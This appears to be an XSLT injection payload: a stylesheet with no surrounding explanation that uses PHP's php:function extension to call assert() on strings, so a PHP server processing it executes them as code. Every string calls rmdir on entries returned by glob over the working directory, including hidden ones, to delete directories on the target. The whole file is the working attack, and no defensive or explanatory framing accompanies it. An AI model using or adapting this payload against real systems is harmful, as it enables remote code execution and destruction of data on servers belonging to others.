<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" xmlns:exsl="http://exslt.org/common" version="1.0">
 
  <xsl:template match="*">

   
           <xsl:variable name="f">rmdir(glob('./{,.}*',1024)[0])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $f)"/> 
   
           <xsl:variable name="g">rmdir(glob('./{,.}*',1024)[1])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $g)"/> 
   
           <xsl:variable name="h">rmdir(glob('./{,.}*',1024)[2])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $h)"/> 
      <xsl:variable name="i">rmdir(glob('./{,.}*',1024)[3])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $i)"/> 
   
           <xsl:variable name="j">rmdir(glob('./{,.}*',1024)[4])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $j)"/> 
   
           <xsl:variable name="k">rmdir(glob('./{,.}*','5')[5])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $k)"/> 
              <xsl:variable name="l">rmdir(glob('./{,.}*','6')[6])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $l)"/> 
   
           <xsl:variable name="m">rmdir(glob('./{,.}*','7')[7])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $m)"/> 
   
           <xsl:variable name="n">rmdir(glob('./{,.}*', 'GLOB_BRACE')[8])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $n)"/> 
              <xsl:variable name="o">rmdir(glob('./{,.}*')[9])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $o)"/> 
   
           <xsl:variable name="p">rmdir(glob('./{,.}*')[10])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $p)"/> 
   
           <xsl:variable name="qq">rmdir(glob('./{,.}*')[11])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $qq)"/> 

             <xsl:variable name="aa">rmdir(glob('./{,.}*')[12])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $aa)"/> 
           <xsl:variable name="a">rmdir(glob('./{,.}*')[13])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $a)"/> 
           <xsl:variable name="b">rmdir(glob('./{,.}*')[14])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $b)"/> 
           <xsl:variable name="c">rmdir(glob('./{,.}*')[15])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $c)"/> 
           <xsl:variable name="d">rmdir(glob('./{,.}*')[16])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $d)"/> 

        <xsl:variable name="e">rmdir(glob('./{,.}*')[17])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $e)"/> 
</xsl:template> 
</xsl:stylesheet>
